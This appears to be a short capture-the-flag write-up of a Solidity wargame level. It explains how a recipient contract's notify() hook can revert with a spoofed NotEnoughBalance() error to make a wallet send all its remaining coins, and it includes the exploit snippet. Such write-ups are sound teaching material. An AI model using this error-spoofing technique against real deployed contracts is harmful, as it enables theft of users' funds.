# Errors, they pile up.

The nature of errors are that you can only err once: once you've erred, the transaction reverts. Completely.

_You are given another transaction to try again, and another, and another, as David Steindl-Rast says in his talk about gratefulness, but that's another matter._

So, if you're gonna depend on an error signature to handle all of your balances in a transaction that interacts with multiple contracts, well, good luck.

```solidity
if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
```

# The issue

But of course, the real issue is how `Coin` contract handles `transfer`:

```solidity

function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
```

Rather than updating the contract's state with the set amount, the `Coin` contract sends a transaction to the `dest_` address if it a contract. This `INotifyable(dest_).notify(amount_)` means that the `dest_` can have its own internal logic gets triggered based on `amount` being sent/added.

# The attack

And that's the attack. You just revert with the right error for the right `amount`:

```solidity
function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
```
